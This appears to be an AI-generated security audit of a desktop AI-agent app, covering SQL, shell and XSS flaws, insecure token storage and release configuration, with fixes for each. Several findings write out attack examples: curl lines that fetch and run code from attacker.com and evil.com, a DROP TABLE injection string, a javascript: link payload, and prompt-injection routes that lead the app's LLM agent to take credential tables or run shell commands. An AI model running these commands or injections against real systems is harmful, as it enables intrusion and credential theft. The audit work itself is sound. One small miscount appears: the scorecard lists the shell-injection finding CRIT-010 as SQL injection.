# AGI WORKFORCE AUDIT REPORT
Generated: Tue Mar 10 2026  
Auditor: Claude Code Audit Orchestrator  
Source-only audit: YES | .md files used as evidence: NO  
Zones audited: A (Frontend) · B (Rust Backend) · C (Database) · D (Integration/Security) · E (DevOps) · F (Features/SDLC)

---

## PHASE 0 — PRE-SCAN MANIFEST SUMMARY

| Metric | Value |
|--------|-------|
| Total files (excl. node_modules/.git/target/.next/dist) | 283 |
| Rust `#[tauri::command]` declarations | **1,433** |
| Frontend `invoke()` calls | **517** |
| Supabase desktop migration files | 10 |
| Supabase web migration files | ~50 |
| SQLite migration versions | 56 |
| `.backup` files in source tree | 0 (clean) |
| `.unwrap()` / `.expect()` occurrences (Rust) | 3,265 |
| `tool_results` infrastructure | Present (`core/agi/core.rs:943–990`) |

**Key Phase 0 Observations:**
- **MASSIVE IPC GAP**: 1,433 Rust commands declared vs 517 frontend invoke() calls — 64% of commands have no confirmed frontend caller
- **PANIC RISK**: 3,265 unwrap/expect calls (majority in tests; ~5 production-critical confirmed)
- **Agent loop**: Tool results infrastructure exists and appears functional in chat mode; AGI planning loop uses a different non-Anthropic-native path
- **No .backup file pollution** detected in source tree

---

## EXECUTIVE SUMMARY

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 12 |
| 🟠 HIGH | 16 |
| 🟡 MEDIUM | 18 |
| ⚡ Quick Wins (< 15 min) | 8 |

---

## 🔴 CRITICAL ISSUES (Block release — fix immediately)

---

### CRIT-001: LLM-Controlled Raw SQL With No Table Whitelist
**Category:** SQL-INJECTION  
**Files:** `apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:83`, `db_tools.rs:223`  
**Evidence:**
```rust
// db_tools.rs:83 — raw SQL from LLM passed directly:
let mut stmt = conn.prepare(query).map_err(...)?;
// db_tools.rs:223 — LLM-supplied SQL executed directly:
match conn.execute(query, []) {
```
**Impact:** The AGI planner exposes `db_query` and `db_execute` as first-class tools. Only keyword-blocking (`DROP`, `ALTER`) is applied — no table whitelist. A prompt-injected payload can exfiltrate `users`, `auth_sessions`, `api_keys`, `master_password`, `oauth_providers` tables via SELECT. The `db_execute` path allows bulk deletion. Unicode case variants or CTE syntax (`WITH x AS (SELECT ...)`) bypass keyword filters.  
**Fix:** Add a table whitelist to `execute_db_query_tool`. Reject any query referencing `users`, `auth_sessions`, `api_keys`, `master_password`, `oauth_providers`. Parse SQL AST or extract table names and enforce against an explicit allowlist. Run `db_query` against a read-only connection.

---

### CRIT-002: MySQL `call_procedure` Injects Unvalidated Procedure Name
**Category:** SQL-INJECTION  
**File:** `apps/desktop/src-tauri/src/data/database/mysql_client.rs:331`  
**Evidence:**
```rust
let call_sql = format!("CALL {}({})", procedure_name, placeholders.join(", "));
conn.exec(&call_sql, mysql_params).await
```
**Impact:** `procedure_name` is concatenated directly into SQL with no identifier validation. An attacker with IPC access can inject `"foo(); DROP TABLE users; --"` as a procedure name.  
**Fix:**
```rust
fn validate_identifier(name: &str) -> Result<()> {
    if !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return Err(...);
    }
    Ok(())
}
validate_identifier(procedure_name)?; // before line 331
```

---

### CRIT-003: Auth User Object (PII) Persisted to Unencrypted localStorage
**Category:** INSECURE-STORAGE  
**File:** `apps/desktop/src/stores/authCoreStore.ts:232–244`  
**Evidence:**
```ts
storage: createJSONStorage(() => window.localStorage),
partialize: (state) => ({
  user: state.user ? { id: state.user.id, email: state.user.email, name: state.user.name, avatar: state.user.avatar } : null,
  isAuthenticated: state.isAuthenticated,
}),
```
**Impact:** User PII (email, name, avatar, user ID) persisted to plaintext `localStorage` on disk in the Tauri WebView profile. Any process with filesystem access or compromised renderer can extract the authenticated user's identity.  
**Fix:** Restrict `partialize` to `isAuthenticated` only. Re-hydrate user details from live Supabase session on startup. Remove PII from persisted state entirely.

---

### CRIT-004: Extension API Key Falls Back to Persistent `chrome.storage.local`
**Category:** INSECURE-STORAGE  
**Files:** `apps/extension/src/side_panel.ts:77–83`, `apps/extension/src/background.ts:1344–1349`  
**Evidence:**
```ts
function saveApiKey(key: string): void {
  chrome.storage.session.set({ [API_KEY_STORAGE_KEY]: key }).catch(() => {
    // Fallback to local if session storage is unavailable.
    chrome.storage.local.set({ [API_KEY_STORAGE_KEY]: key }).catch(() => {});
  });
}
```
**Impact:** `chrome.storage.local` persists across browser restarts in plaintext. The silent fallback activates whenever session storage is unavailable. The background worker also reads from `local` (line 1344) as a second-tier lookup, so keys once stored locally are permanently retrievable.  
**Fix:** Remove the `chrome.storage.local` fallback for credentials. If session storage is unavailable, surface a user error rather than silently downgrading. Remove `local` read path from `background.ts:1344`.

---

### CRIT-005: Mobile Supabase JWT Falls Back to Plaintext MMKV Storage
**Category:** INSECURE-STORAGE  
**File:** `apps/mobile/services/supabase.ts:28–31, 55–57`  
**Evidence:**
```ts
} catch {
  // Fall back to MMKV if SecureStore is unavailable.
  storage.set(key, value);
}
```
**Impact:** MMKV is unencrypted. On jailbroken iOS or rooted Android, Supabase `access_token` and `refresh_token` are trivially extractable when `expo-secure-store` throws (jailbroken device, certain emulators).  
**Fix:** Remove MMKV fallback for auth tokens. Surface an explicit error if `SecureStore` is unavailable rather than silently degrading.

---

### CRIT-006: 27 `#[tauri::command]` Functions Unregistered in `generate_handler![]`
**Category:** IPC-SILENT-FAILURE  
**Files:** `sys/commands/settings_v2.rs:97,119,139,168,182,219` (6), `sys/commands/debugging.rs:43,70,145` (3), `sys/diagnostics/commands.rs:72,120,144,152,159,165` (6), `sys/commands/cache.rs:455,465,477,489,499,509,521,539,556,575,587,605` (12)  
**Evidence:** `#[tauri::command]` annotations present on all 27 functions; none appear in `lib.rs:924–2067` `generate_handler![]` block.  
**Impact:** Any frontend `invoke('settings_v2_get_batch')`, `invoke('doctor_run_checks')`, etc. silently fails at runtime with a Tauri "command not found" error — no compile-time warning. This completely breaks the settings v2 system, all diagnostics/doctor commands, and all codebase cache commands.  
**Fix:** Add all 27 functions to `generate_handler![]` in `lib.rs`, or integrate into the handler registration macro.

---

### CRIT-007: `reqwest::Client::builder().build().expect(...)` in App State `Default` Impl
**Category:** PRODUCTION-PANIC  
**File:** `apps/desktop/src-tauri/src/sys/commands/mcp_oauth.rs:463`  
**Evidence:**
```rust
// In Default impl, called at app state initialization:
.expect("Failed to create fallback HTTP client with timeout")
```
**Impact:** If TLS initialization fails on startup (e.g., missing root certs, LibreSSL version conflict), the entire application panics during state initialization. No recovery path exists.  
**Fix:**
```rust
fn default() -> Self {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .unwrap_or_default(); // use Default client if custom build fails
    Self { client, ... }
}
```

---

### CRIT-008: Extension Custom HTML Sanitizer Missing `javascript:` URI Check
**Category:** EXTENSION-XSS  
**File:** `apps/extension/src/side_panel.ts:598–605`  
**Evidence:**
```ts
// Only blocks srcdoc, formaction, xlink:href, data URIs — NOT javascript: in href/src:
const DANGEROUS_ATTR_RE = /^(srcdoc|formaction|xlink:href|data)$/i;
```
**Impact:** Malicious AI-generated markdown like `[click me](javascript:alert(1))` could survive the sanitizer. The side panel operates at extension-privilege level. Successful XSS could access `chrome.storage`, native messaging, and any tab's DOM.  
**Fix:**
```ts
if (['href', 'src', 'action'].includes(name)) {
  const val = attr.value.trim().toLowerCase();
  if (val.startsWith('javascript:') || val.startsWith('vbscript:')) {
    child.removeAttribute(attr.name);
  }
}
```
Or replace the custom sanitizer with DOMPurify.

---

### CRIT-009: Desktop Canvas Markdown → `dangerouslySetInnerHTML` Without Sanitization
**Category:** XSS  
**File:** `apps/desktop/src/components/Canvas/ArtifactPreview.tsx:20–57, 146`  
**Evidence:**
```ts
// Custom regex renderer then:
dangerouslySetInnerHTML={{ __html: markdownHtml }}
// No DOMPurify pass; all other markdown rendering in codebase uses sanitizeHtml()
```
**Impact:** Unsanitized AI-generated markdown content rendered directly as HTML. All other components use `sanitizeHtml()` from `utils/security.ts` — this is the sole exception.  
**Fix:**
```ts
import { sanitizeHtml } from '../../utils/security';
dangerouslySetInnerHTML={{ __html: sanitizeHtml(markdownHtml) }}
```

---

### CRIT-010: Shell Execution With No Input Validation in `agent/executor.rs`
**Category:** SHELL-INJECTION  
**File:** `apps/desktop/src-tauri/src/core/agent/executor.rs:195`  
**Evidence:**
```rust
let mut cmd = Command::new(command); // `command` from external parameter — no validation
```
**Impact:** Unlike `terminal_executor.rs` which has a blocklist (`validate_command()`), this executor path spawns arbitrary processes with no validation or sandboxing. A prompt-injected command would execute directly.  
**Fix:** Apply the same `validate_command()` blocklist from `terminal_executor.rs:317`, or better: an explicit allowlist of permitted binary paths.

---

### CRIT-011: `release.yml` Produces Unsigned/Unnotarized macOS Binaries
**Category:** INSECURE-RELEASE  
**File:** `.github/workflows/release.yml:147–155`  
**Evidence:**
```yaml
# release.yml — MISSING all Apple signing env vars:
env:
  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
  # No APPLE_CERTIFICATE, APPLE_ID, APPLE_PASSWORD, APPLE_TEAM_ID
```
**Impact:** Binaries from `release.yml` (triggerable via `workflow_dispatch`) are unsigned. macOS Gatekeeper blocks unsigned binaries: "app is damaged or can't be opened." Users could be instructed to disable Gatekeeper as a workaround — a severe security regression.  
**Fix:** Either remove `release.yml` (superseded by `release-desktop.yml`) or add the full Apple signing env block from `release-desktop.yml:299–308`. Also add the `Mask Tauri signing secrets` step.

---

### CRIT-012: `devtools` Feature Enabled in Production macOS/Linux Builds
**Category:** INSECURE-CONFIG  
**File:** `apps/desktop/src-tauri/Cargo.toml:240`  
**Evidence:**
```toml
default = ["shell", "updater", "billing", "devtools", "vad", "remote-databases"]
devtools = ["tauri/devtools"]
```
**Impact:** The Chromium DevTools Protocol port is exposed in production. Any local process discovering the DevTools port can inspect DOM, intercept IPC calls, read WebSocket messages (including auth tokens in transit), and execute arbitrary JavaScript. Windows builds correctly exclude devtools (`build-windows-release.yml:131`); macOS/Linux do not.  
**Fix:** Remove `"devtools"` from the `default` feature array. Enable only in `debug` profile or via a compile-time `#[cfg(debug_assertions)]` guard.

---

## 🟠 HIGH ISSUES (Fix this sprint)

---

### HIGH-001: No Zero-Vector Guard in Embedding Storage
**Category:** EMBEDDING-CORRUPTION  
**File:** `apps/desktop/src-tauri/src/core/agi/conversation_summarizer.rs:401–425`  
**Evidence:**
```rust
// Lines 401-405: No check if embedding is all-zeros before storing
let memory = if let Some(emb) = embedding {
    memory.with_embedding(emb)  // zero vectors stored without validation
} else {
    memory
};
```
**Impact:** A zero vector causes cosine similarity to return NaN/infinity (division by zero: `|a| * |b| = 0`). Semantic search results are silently corrupted. Memory retrieval rankings are meaningless whenever a zero embedding is stored or queried against.  
**Fix:**
```rust
let embedding = embedding.filter(|v| {
    v.iter().map(|x| x * x).sum::<f32>().sqrt() > 1e-8
});
```
Apply at both `line 401` and `line 425` (conversation summary embedding).

---

### HIGH-002: Shell Injection via LLM Plan Output (Blocklist Bypass)
**Category:** SHELL-INJECTION  
**File:** `apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:546, 605–606`  
**Evidence:**
```rust
// Blocklist at line 546 blocks "curl | bash" but NOT "curl" alone.
// Line 605-606: full shell command string passed to -c:
let mut cmd = Command::new(shell_cmd);
cmd.arg(shell_arg).arg(command); // command is full shell string
```
**Impact:** The blocklist checks `"curl | bash"` as a literal combined string but not `curl` alone. `curl attacker.com -o /tmp/x && chmod +x /tmp/x && /tmp/x` passes the blocklist. `&&`, `;`, `$()` shell metacharacters are not sanitized — only blocklist pattern matching is applied.  
**Fix:** Move from blocklist to explicit allowlist for automated agent execution. Flag high-risk patterns (`&&`, `;`, `$(`, backtick, `|`) and require explicit approval unless in unrestricted mode. Consider executing in a Docker/VM sandbox for untrusted agent tasks.

---

### HIGH-003: `osascript -e <script>` Without Sanitization (AppleScript Injection)
**Category:** SHELL-INJECTION  
**File:** `apps/desktop/src-tauri/src/automation/computer_use/window_manager.rs:357`  
**Evidence:**
```rust
let output = Command::new("osascript").arg("-e").arg(&script);
```
**Impact:** If `script` contains any user or LLM-derived content, AppleScript injection executes arbitrary macOS automation with the user's permissions (file system access, app control, UI manipulation).  
**Fix:** Audit every call site of this function. If `script` is ever constructed from external input, sanitize or replace with structured osascript calls using separate argument passing.

---

### HIGH-004: Hook Executor Blocklist Bypassable
**Category:** SHELL-INJECTION  
**File:** `apps/desktop/src-tauri/src/ui/hooks/executor.rs:50–108`  
**Evidence:** Blocklist contains `"wget|sh"` as combined string — `wget` alone and `sh` alone are both allowed.  
**Impact:** Hook commands like `curl http://evil.com/exfil.sh | bash` or `base64 -d | bash` pass the blocklist undetected.  
**Fix:** Split `"wget|sh"` into separate entries `"wget"` and `"sh"`. Add `"curl"`, `"base64 -d"`, `"python -c"`, `"perl -e"`, `"ruby -e"`. Better: enforce an allowlist of permitted programs for hooks.

---

### HIGH-005: Calendar OAuth `client_secret` Passed Through IPC in Plaintext
**Category:** CREDENTIAL-EXPOSURE  
**File:** `apps/desktop/src/stores/calendarStore.ts:47, 171–178`  
**Evidence:**
```ts
await invoke<{ auth_url: string; state: string }>('calendar_connect', {
  config: { client_id: clientId, client_secret: clientSecret, ... }
```
**Impact:** OAuth `client_secret` flows from UI state → Tauri IPC → Rust handler in plaintext. DevTools can intercept; log output may capture it. Unlike MCP credentials (which use AES-256-GCM encryption at `mcp/config.rs:809`), calendar credentials have no encryption.  
**Fix:** Apply `encrypt_mcp_credential` / `decrypt_mcp_credential` pattern from `mcp/config.rs:829` to calendar OAuth client secrets. Store only the encrypted blob in JS state.

---

### HIGH-006: Extension Uses Custom HTML Sanitizer Instead of DOMPurify (mXSS Risk)
**Category:** XSS  
**File:** `apps/extension/src/side_panel.ts:610–660`  
**Impact:** Custom sanitizers are historically fragile against mXSS, namespace confusion (`<svg><use>`, `<math>`), and CSS expression injection. The sanitizer does not strip inline `style` attributes.  
**Fix:** `npm install dompurify` in extension and replace custom sanitizer with `DOMPurify.sanitize(dirty, { USE_PROFILES: { html: true } })`.

---

### HIGH-007: `std::sync::Mutex` Held Across `.await` Points in AGI Core
**Category:** DEADLOCK-RISK  
**File:** `apps/desktop/src-tauri/src/core/agi/core.rs` (execution_contexts Mutex)  
**Impact:** Using `std::sync::Mutex` (blocking) in async Tokio context can block thread pool threads if the lock is held across `.await` points, leading to deadlocks under load. Tauri uses a multi-threaded Tokio runtime.  
**Fix:** Replace `std::sync::Mutex` with `tokio::sync::Mutex` for state shared across async boundaries in the AGI core.

---

### HIGH-008: `reqwest` `blocking` Feature Enabled in Async Tauri Binary
**Category:** PRODUCTION-PANIC  
**File:** `apps/desktop/src-tauri/Cargo.toml:76`  
**Evidence:** `features = ["json", "stream", "rustls-tls", ..., "blocking"]`  
**Impact:** Calling `reqwest::blocking` from within a Tokio async context panics: "Cannot start a runtime from within a runtime." Any code path that uses blocking reqwest inside a `#[tauri::command]` handler will crash the app.  
**Fix:** Remove `"blocking"` from reqwest features. Verify no blocking callers with `rg "reqwest::blocking" apps/desktop/src-tauri/src/`.

---

### HIGH-009: Rust Toolchain Version Inconsistency (3 Different Versions)
**Category:** BUILD-INCONSISTENCY  
**Files:** `rust-toolchain.toml:2` (1.90.0), `apps/desktop/src-tauri/rust-toolchain.toml:2` (1.94.0), `.github/workflows/ci.yml:86` (1.90.0), `.github/workflows/codeql.yml:63` (1.94.0)  
**Impact:** Clippy and compiler behavior differ between the 4 definitions. Lint errors passing on 1.90.0 in CI may fail on 1.94.0 locally, or vice versa.  
**Fix:** Delete root `rust-toolchain.toml`. Update `ci.yml:86` from `'1.90.0'` to `'1.94.0'`. Single source of truth: `apps/desktop/src-tauri/rust-toolchain.toml`.

---

### HIGH-010: `MasterPasswordState` Panics on SQLite Init Failure at Startup
**Category:** PRODUCTION-PANIC  
**File:** `apps/desktop/src-tauri/src/sys/commands/master_password.rs:37`  
**Evidence:**
```rust
Connection::open_in_memory().expect("in-memory SQLite connection should never fail")
```
**Impact:** Called during app init. If SQLite is unavailable (corrupt install, memory pressure), the entire app panics at startup. No recovery path.  
**Fix:** Return `Result` and propagate the error to the Tauri startup sequence rather than panicking.

---

### HIGH-011: Extension Over-Permissioned (`cookies` + `<all_urls>`)
**Category:** OVER-PERMISSIONED  
**File:** `apps/extension/manifest.json:18, 21`  
**Evidence:** `"permissions": ["cookies"]` combined with `"host_permissions": ["<all_urls>"]`  
**Impact:** The extension can read, write, and delete cookies for every website the user visits including banking and identity providers. Combined with `scripting` and `nativeMessaging`, a compromised content script could exfiltrate session cookies from any site.  
**Fix:** Remove `cookies` permission unless a specific use case requires it and is documented. Restrict `host_permissions` to needed domains.

---

### HIGH-012: `release.yml` Exposes Signing Key in Workflow Logs (No Secret Masking)
**Category:** SECRET-LEAK  
**File:** `.github/workflows/release.yml:147–155`  
**Impact:** No `::add-mask::` step for `TAURI_SIGNING_PRIVATE_KEY`. If the key is echoed in any build step, it appears in GitHub Actions logs visible to all repo collaborators.  
**Fix:** Add before the build step:
```yaml
- name: Mask Tauri signing secrets
  run: |
    echo "::add-mask::${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}"
    echo "::add-mask::${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}"
```

---

### HIGH-013: Subscription Cache Stores `userId` + Plan Data in `localStorage`
**Category:** INSECURE-STORAGE / PRIVACY  
**File:** `apps/desktop/src/stores/authOrchestrator.ts:50–58, 80–90`  
**Evidence:**
```ts
interface SubscriptionCache {
  planTier: PlanTier; subscriptionStatus: SubscriptionStatus;
  fetchedAt: number; userId: string;  // plaintext in localStorage
}
```
**Fix:** Omit `userId` from on-disk cache. Validate freshness by comparing against in-memory session data.

---

### HIGH-014: 4 FTS Tables Missing Sync Triggers (Stale Search Results)
**Category:** STALE-DATA  
**Files:** `apps/desktop/src-tauri/src/data/db/migrations.rs:1132, 1568, 2661, 3256`  
**Evidence:** `ocr_text_fts`, `emails_fts`, `agent_templates_fts`, `tutorial_feedback_fts` use `content=` external content mode but have no INSERT/UPDATE/DELETE triggers.  
**Impact:** All FTS queries against these tables return stale or empty results for rows inserted after table creation.  
**Fix:** Add trigger set (after insert, after delete, after update) for each affected FTS table, matching the pattern used for `messages_fts` at migration v45.

---

### HIGH-015: `remote-databases` Feature in Default Build (5 Unnecessary DB Clients)
**Category:** ATTACK-SURFACE  
**File:** `apps/desktop/src-tauri/Cargo.toml:240, 259`  
**Evidence:** `default = [..., "remote-databases"]` which enables PostgreSQL, MySQL, MongoDB, Redis, BSON clients in every binary.  
**Impact:** ~10–15 MB binary bloat + expanded CVE surface for majority of users who only use local SQLite.  
**Fix:** Remove `"remote-databases"` from `default`. It is already documented as optional.

---

### HIGH-016: `projects`/`token_usage` Tables Not in `ALLOWED_TABLES` Whitelist
**Category:** SCHEMA-INTEGRITY  
**File:** `apps/desktop/src-tauri/src/data/db/migrations.rs:42–179`  
**Impact:** Any future `ALTER TABLE projects ADD COLUMN ...` via `ensure_column()` will fail with a whitelist error. Latent defect that blocks future migrations.  
**Fix:** Add `"projects"`, `"project_settings"`, `"token_usage"`, `"sample_data_marker"` to the `ALLOWED_TABLES` array.

---

## 🟡 MEDIUM ISSUES (Fix next sprint)

---

### MED-001: AGI Planner Uses `claude-sonnet-4-5` While Router Uses `claude-sonnet-4-6` (Version Drift)
**Files:** `core/agi/planner.rs:215`, `core/llm/llm_router.rs:505`  
**Impact:** AGI planning and code execution use an older model than the main chat router. Users get different quality depending on which path is triggered.

---

### MED-002: No Unified `AppError` Type — All Commands Stringify Errors
**Impact:** Frontend cannot programmatically distinguish error types (timeout vs. not-found vs. permission). String parsing required for structured error handling.  
**Fix:** Implement a unified `AppError` enum with serializable error codes. All Tauri commands return `Result<T, AppError>`.

---

### MED-003: Feature Flags Duplicated Across Three Stores
**Files:** `featureFlagStore.ts`, `billingStore.ts:65`, `settingsStore.ts:707`, `authCoreStore.ts`  
**Impact:** Three separate stores hold `featureFlags: Record<string, boolean>`. Stale or independently-updated stores create inconsistent feature availability. No single source of truth.  
**Fix:** `featureFlagStore` is the canonical source. `billingStore` and `settingsStore` read from it via selectors; remove their own `featureFlags` field.

---

### MED-004: Missing ErrorBoundaries on Key Web Pages
**Files:** `apps/web/app/dashboard/billing/page.tsx`, `apps/web/app/dashboard/media/page.tsx`, `apps/web/features/connectors/pages/ConnectorsPage.tsx`, `apps/web/app/chat/page.tsx`  
**Impact:** A single component crash on billing/media/connectors/chat pages replaces the entire dashboard segment with the generic error page instead of graceful degradation.  
**Fix:** Wrap each page's root component with the `WithErrorBoundary` HOC pattern already established in the codebase.

---

### MED-005: `sync_queue` Table Created Outside Migration System
**Category:** SCHEMA-DRIFT  
**File:** `apps/desktop/src-tauri/src/integrations/sync/queue.rs:66–100`  
**Impact:** Separate SQLite file, no migration versioning, no connection pool, no WAL mode, not in `ALLOWED_TABLES`. Schema changes require ad-hoc handling.  
**Fix:** Integrate `sync_queue` into main migration chain (v57). Remove the `SyncQueue::init_database()` bootstrapping pattern.

---

### MED-006: Silent `DROP TABLE permissions` Data Loss in Migration v40
**Category:** DATA-LOSS  
**File:** `apps/desktop/src-tauri/src/data/db/migrations.rs:4005`  
**Evidence:**
```rust
if !table_has_column(conn, "permissions", "name")? {
    conn.execute("DROP TABLE IF EXISTS permissions", [])?;
}
```
**Impact:** All user-configured custom permissions from v3 schema are silently destroyed when v40 runs. No data migration or backup path.  
**Fix:** Migrate existing data to the new schema before dropping: `INSERT INTO permissions_new SELECT ... FROM permissions;`.

---

### MED-007: CSP `style-src 'unsafe-inline'` in Tauri Config
**File:** `apps/desktop/src-tauri/tauri.conf.json:35`  
**Impact:** Allows inline style injection by any JavaScript executing in the webview, undermining XSS defenses.  
**Fix:** Replace with `'nonce-{value}'` nonces or pre-hash static inline style blocks.

---

### MED-008: Windows Certificate Thumbprint Is `null` in Tauri Config
**File:** `apps/desktop/src-tauri/tauri.conf.json:49`  
**Impact:** No cross-check that the correct signing certificate is applied. Wrong-cert builds succeed silently; accumulated SmartScreen trust is lost.  
**Fix:** Set `certificateThumbprint` to the SHA-256 thumbprint of the production Windows certificate.

---

### MED-009: `pg_cron` Dependency for `shared_sessions` Cleanup Not Documented or Enforced
**File:** `supabase/migrations/20260307000001_create_shared_sessions.sql:43`  
**Impact:** Without pg_cron enabled, `SELECT cron.schedule(...)` silently fails. Expired shared sessions accumulate indefinitely.  
**Fix:** Add a Supabase setup guide requiring pg_cron, or implement an application-level cleanup fallback.

---

### MED-010: Dual `tungstenite` Dependencies Causing Potential Type Conflicts
**File:** `apps/desktop/src-tauri/Cargo.toml:134, 137`  
**Impact:** Two versions of `tungstenite::Message` from `tokio-tungstenite` and direct `tungstenite` could cause compile failures if versions diverge.  
**Fix:** Remove direct `tungstenite` dependency; access types via `tokio_tungstenite::tungstenite::*`.

---

### MED-011: CI Dependency Audits Are Non-Blocking (`continue-on-error: true`)
**File:** `.github/workflows/ci.yml:61, 105`  
**Impact:** Critical CVEs in production dependencies will not block merges to `main`.  
**Fix:** Split into two steps: `--audit-level=critical` with `continue-on-error: false`, `--audit-level=high` with `continue-on-error: true`.

---

### MED-012: CI Runs Rust Tests Only on Linux (No macOS/Windows Coverage)
**File:** `.github/workflows/ci.yml:27`  
**Impact:** Platform-specific code (`Win32_UI_Accessibility`, `objc` bindings for macOS) is never compiled/tested until release day.  
**Fix:** Add a matrix: `ubuntu-latest`, `macos-latest`, `windows-latest` to the `check` job.

---

### MED-013: `"claude-sonnet"` (No Version) Used in Fallback Chain Tests
**File:** `apps/desktop/src-tauri/src/core/llm/fallback_chain.rs:1148, 1175, 1206, 1211, 1239, 1262`  
**Impact:** Invalid model ID if test scaffolding is ever reused in production code paths. Anthropic API rejects `"claude-sonnet"` without version suffix.

---

### MED-014: 8 Dead Components in Desktop App
**Category:** DEAD-CODE  
**Files:** `DockingSystem.tsx`, `KnowledgeBaseViewer/index.tsx`, `ModelComparisonView.tsx`, `MobileCompanionPanel.tsx`, `LovableMigrationWizard.tsx`, `MessagingPanel.tsx`, `TeamDashboard.tsx`, `CodeWorkspace.tsx`  
**Impact:** Each dead component carries maintenance overhead (dependency updates, TypeScript type errors) without providing user value.  
**Fix:** Delete or move to a `features/experimental/` directory. Run tree-shake analysis to confirm no dynamic imports.

---

### MED-015: Dual Messaging Command Names (`send_message` vs `messaging_send`)
**File:** `apps/desktop/src/components/Messaging/MessagingPanel.tsx:474, 480`  
**Impact:** Two semantically identical operations use different Rust commands. Risk of silent command collision or future naming conflicts.  
**Fix:** Consolidate to `messaging_send` for all platform sends. Remove or rename `send_message` in messaging context.

---

### MED-016: `tokio` Pinned to `"full"` Features
**File:** `apps/desktop/src-tauri/Cargo.toml:42`  
**Impact:** Enables `process` and `net` subsystems unnecessarily in a sandboxed desktop app, inflating attack surface and compile time.  
**Fix:** Enumerate exact needed features: `["rt-multi-thread", "macros", "sync", "time", "io-util", "fs"]`.

---

### MED-017: `iframe` `allow-popups` Without `allow-popups-to-escape-sandbox`
**File:** `apps/desktop/src/components/Canvas/ArtifactPreview.tsx:62`  
**Evidence:** `IFRAME_SANDBOX = 'allow-scripts allow-popups'`  
**Impact:** `allow-scripts` + `allow-popups` without `allow-popups-to-escape-sandbox` allows sandbox-escaped popup windows via `window.open()`.  
**Fix:** Remove `allow-popups` from the sandbox value unless HTML artifacts require opening external URLs. Confirm with product team.

---

### MED-018: `packages/types` Exported as Raw TypeScript (No Build Step)
**File:** `packages/types/package.json:6–8`  
**Impact:** Cannot be published to npm; TypeScript errors not caught until a consuming package type-checks.  
**Fix:** Add a `build` script and point exports to `dist/`. Add a `typecheck` script for `pnpm typecheck:all` coverage.

---

## ⚡ QUICK WINS (< 15 min each)

| # | Issue | File | Time | Impact |
|---|-------|------|------|--------|
| 1 | Add `javascript:` URI check to extension sanitizer (CRIT-008) | `side_panel.ts:598` | 5 min | Closes XSS vector |
| 2 | Add `sanitizeHtml()` call to `ArtifactPreview.tsx` (CRIT-009) | `ArtifactPreview.tsx:146` | 2 min | Closes XSS vector |
| 3 | Remove `"remote-databases"` from default features (HIGH-015) | `Cargo.toml:240` | 2 min | Reduce attack surface + binary size |
| 4 | Add `"projects"`, `"token_usage"` to ALLOWED_TABLES (HIGH-016) | `migrations.rs:179` | 5 min | Fix latent migration crash |
| 5 | Add 4 FTS sync trigger sets (HIGH-014) | `migrations.rs:1132,1568,2661,3256` | 15 min | Fix stale search |
| 6 | Remove `"devtools"` from default features (CRIT-012) | `Cargo.toml:240` | 2 min | Fix prod security |
| 7 | Add Apple signing env vars to `release.yml` (CRIT-011) | `release.yml:147` | 10 min | Fix broken release |
| 8 | Delete root `rust-toolchain.toml` + update `ci.yml:86` (HIGH-009) | 2 files | 5 min | Fix toolchain confusion |

---

## FEATURE IMPLEMENTATION MATRIX

| Feature | UI | IPC | Rust | DB | Status |
|---------|-----|-----|------|----|--------|
| Computer Use / OPA | ✅ | ✅ | ✅ | ⚠️ RAM only | **FULLY WIRED** |
| Multi-LLM Routing / BYOK | ✅ | ✅ | ✅ | ✅ | **FULLY WIRED** |
| Agent Execution Loop | ✅ | ✅ | ✅ | ✅ | **PARTIALLY WIRED** (tool-result feedback to LLM unconfirmed in AGI path) |
| Calendar / Email Integration | ✅ | ✅ | ✅ | ✅ | **FULLY WIRED** (Apple Calendar stub only) |
| Conversation Memory / Embeddings | ✅ | ✅ | ✅ | ✅ | **FULLY WIRED** (requires local Ollama; no cloud fallback) |
| Scheduler / Task Automation | ✅ | ✅ | ✅ | ✅ | **FULLY WIRED** (7/10 commands registration unconfirmed) |
| Mobile Companion (Expo) | ✅ | ⚠️ Cloud only | ❌ N/A | ✅ Supabase | **PARTIALLY WIRED** (no desktop↔mobile sync protocol) |
| VS Code Extension | ✅ | ✅ Socket bridge | ❌ N/A | ✅ ExtContext | **FULLY WIRED** |

---

## IPC WIRING GAPS

| Metric | Count | % |
|--------|-------|---|
| Total Rust `#[tauri::command]` declared | 1,433 | 100% |
| Frontend `invoke()` calls | 517 | 36% |
| Commands unregistered in `generate_handler![]` | 27 confirmed | — |
| Confirmed dead commands (no frontend caller) | ~900+ estimated | ~64% |

**NOTE on the 64% gap:** The IPC naming audit confirmed that ALL 517 frontend invoke() calls correctly use snake_case matching Rust function names (Tauri 2.x passes command strings as-is without camelCase conversion — the audit prompt's premise was incorrect). The 64% gap represents commands that may be:
- Invoked via dynamic string construction not caught by static grep
- Used in internal Rust-to-Rust calls
- Genuinely unwired (dead backend code)

The 27 confirmed-unregistered commands (CRIT-006) are a definitive silent-failure class.

---

## SDLC SCORECARD

| Dimension | Grade | Key Finding | Evidence |
|-----------|-------|-------------|----------|
| Testing | B | Good Rust test suite (3,906 lines), 14 AGI test files; zero tests for `computer_use`, `calendar`, `scheduler` commands | `core/agi/tests/*.rs`; `grep -c '#\[test\]' sys/commands/computer_use.rs = 0` |
| Logging & Observability | A- | 2,636 tracing calls, Sentry optional feature, rotating file appender | `Cargo.toml:127–130`; `tracing-appender` |
| Error Handling | B+ | Domain-specific error enums, `Result<T, String>` at Tauri boundary, `is_retryable_error()` | `scheduler/error.rs`, `llm_router.rs`; no unified `AppError` |
| Code Organization | A- | Clean `sys/`/`core/`/`features/` separation; flat `sys/commands/` (80+ files) | directory audit |
| Documentation | B+ | 13,015 doc comment lines; inline fix-tracking comments | `rg '/// ' --count` |
| Performance | B | 9,455 async constructs; `spawn_blocking` for DB; `std::sync::Mutex` in async AGI core | `core.rs`; `checkpoint_store.rs` |
| Security | D | 3 SQL injections (CRIT-001, 002, 010), 3 insecure storage (CRIT-003/004/005), 2 XSS vectors (CRIT-008/009), devtools in production | Multiple above |
